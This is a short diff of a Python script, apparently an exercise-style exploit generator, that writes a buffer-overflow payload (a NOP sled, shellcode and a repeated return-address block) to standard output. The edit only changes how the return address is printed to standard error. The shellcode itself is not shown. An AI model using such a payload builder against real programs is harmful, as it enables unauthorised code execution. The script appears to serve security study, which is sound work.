@@ -16,5 +16,5 @@ RETURNADDRESSBLOCK = RETURNADDRESS * 0x100
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
     stdout.write(NOPSLED + SHELLCODE + RETURNADDRESSBLOCK + B'\n')
 
-with os.fdopen(sys.stderr.fileno(), "wb", closefd=False) as stderr:
-    stderr.write(str(RETURNADDRESS.hex()) + "\n")
+with os.fdopen(sys.stderr.fileno(), "w", closefd=False) as stderr:
+    stderr.write(RETURNADDRESS.hex() + "\n")
